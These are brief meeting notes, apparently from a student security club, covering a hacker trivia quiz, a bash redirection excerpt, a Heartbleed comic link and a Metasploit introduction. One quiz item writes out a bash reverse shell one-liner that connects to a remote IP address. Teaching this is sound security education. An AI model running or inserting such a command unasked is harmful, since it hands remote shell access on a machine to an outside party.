---
title:  "Meeting Notes for Oct. 10, 2019"
date:   2019-10-10
categories: notes
author: scrypy
---
# Meeting Notes Oct. 10, 2019:

## Hacker Jeopardy -> @scrypy
- **Newz:**
  - This popular electronic doorbell has decided to partner with police departments and provide them easy access to footage recorded on the device. (Amazon Ring)
- **Toolz:**
  - `bash -i >& /dev/tcp/10.0.99.45/80 0>&1`
  - redirection notes 
  ```
  There are two formats for  redirecting  standard  output  and  standard
  error:
         &>word
  and
         >&word

  Of the two forms, the first is preferred.  This is semantically equiva-
  lent to
         >word 2>&1

  stdin=0 - stdout=1 - stderr=2
  ```
- **Knawledge:**
  - This is the basic idea behind the famous Heartbleed Vulnerability https://xkcd.com/1354/

## Metasploit Intro -> @scrypy
- Basics of working through an exploit using Metasploit.

<br>
@scrypy
